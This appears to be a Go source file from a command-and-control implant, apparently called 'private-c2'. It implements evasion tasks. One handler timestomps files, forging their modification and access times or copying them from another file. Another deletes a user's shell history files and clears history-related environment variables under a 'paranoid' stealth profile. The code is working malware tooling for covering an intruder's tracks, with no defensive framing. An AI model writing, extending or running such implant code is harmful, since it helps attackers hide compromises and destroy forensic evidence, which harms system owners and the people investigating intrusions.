package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/implant/evasion/stealth"
)

type timestompRequest struct {
	Path      string `json:"path"`
	Time      string `json:"time,omitempty"`      // RFC3339
	Reference string `json:"reference,omitempty"` // copy atime/mtime from this path
}

func parseTimestompArgs(args string) (timestompRequest, error) {
	var req timestompRequest
	trimmed := strings.TrimSpace(args)
	if strings.HasPrefix(trimmed, "{") {
		if err := json.Unmarshal([]byte(trimmed), &req); err != nil {
			return req, fmt.Errorf("parsing evasion_timestomp JSON: %w", err)
		}
	} else {
		parts := strings.SplitN(trimmed, "|", 2)
		req.Path = strings.TrimSpace(parts[0])
		if len(parts) == 2 {
			req.Time = strings.TrimSpace(parts[1])
		}
	}
	req.Path = strings.TrimSpace(req.Path)
	if req.Path == "" {
		return req, fmt.Errorf("evasion_timestomp requires a path")
	}
	if req.Time != "" && req.Reference != "" {
		return req, fmt.Errorf("evasion_timestomp accepts time or reference, not both")
	}
	return req, nil
}

func handleEvasionTimestomp(_ context.Context, args string) (string, error) {
	req, err := parseTimestompArgs(args)
	if err != nil {
		return "", err
	}

	var stamp time.Time
	switch {
	case req.Reference != "":
		ref, err := os.Stat(req.Reference)
		if err != nil {
			return "", fmt.Errorf("reading reference %s: %w", req.Reference, err)
		}
		stamp = ref.ModTime()
	case req.Time != "":
		stamp, err = time.Parse(time.RFC3339, req.Time)
		if err != nil {
			return "", fmt.Errorf("time must be RFC3339: %w", err)
		}
	default:
		stamp = time.Now().UTC()
	}

	if err := os.Chtimes(req.Path, stamp, stamp); err != nil {
		return "", err
	}
	return marshalJSON(map[string]any{
		"path":  req.Path,
		"mtime": stamp.UTC().Format(time.RFC3339Nano),
	})
}

type cleanupRequest struct {
	Apply   bool `json:"apply"`
	History bool `json:"history"`
}

// historyFiles lists the shell history files considered for cleanup. The list
// is fixed so an operator cannot turn this task into an arbitrary delete.
func historyFiles(home string) []string {
	names := []string{".bash_history", ".zsh_history", ".python_history", ".sh_history", ".lesshst"}
	out := make([]string, 0, len(names))
	for _, name := range names {
		out = append(out, filepath.Join(home, name))
	}
	return out
}

type cleanupResult struct {
	Apply           bool     `json:"apply"`
	HistoryRemoved  []string `json:"history_removed"`
	HistoryPresent  []string `json:"history_present"`
	EnvironmentVars []string `json:"environment_vars"`
	Note            string   `json:"note,omitempty"`
}

func cleanupHistory(home string, apply bool) cleanupResult {
	result := cleanupResult{
		Apply:           apply,
		HistoryRemoved:  []string{},
		HistoryPresent:  []string{},
		EnvironmentVars: []string{},
	}
	for _, path := range historyFiles(home) {
		info, err := os.Stat(path)
		if err != nil || info.IsDir() {
			continue
		}
		result.HistoryPresent = append(result.HistoryPresent, path)
		if apply {
			if err := os.Remove(path); err == nil {
				result.HistoryRemoved = append(result.HistoryRemoved, path)
			}
		}
	}
	return result
}

func handleEvasionCleanup(_ context.Context, args string) (string, error) {
	var req cleanupRequest
	if err := unmarshalArgs(args, &req); err != nil {
		return "", fmt.Errorf("evasion_cleanup args must be JSON: %w", err)
	}
	home, _ := os.UserHomeDir()

	result := cleanupResult{Apply: req.Apply, HistoryRemoved: []string{}, HistoryPresent: []string{}, EnvironmentVars: []string{}}
	if req.History || req.Apply {
		result = cleanupHistory(home, req.Apply)
	}

	// Unsetting history-related variables only affects this process; it does
	// not modify the target's shell configuration.
	result.EnvironmentVars = stealth.NewTraceCleanup(stealth.ProfileParanoid).CleanEnvironment()
	if !req.Apply {
		result.Note = "dry run: pass {\"apply\":true} to delete the listed history files"
	}
	return marshalJSON(result)
}
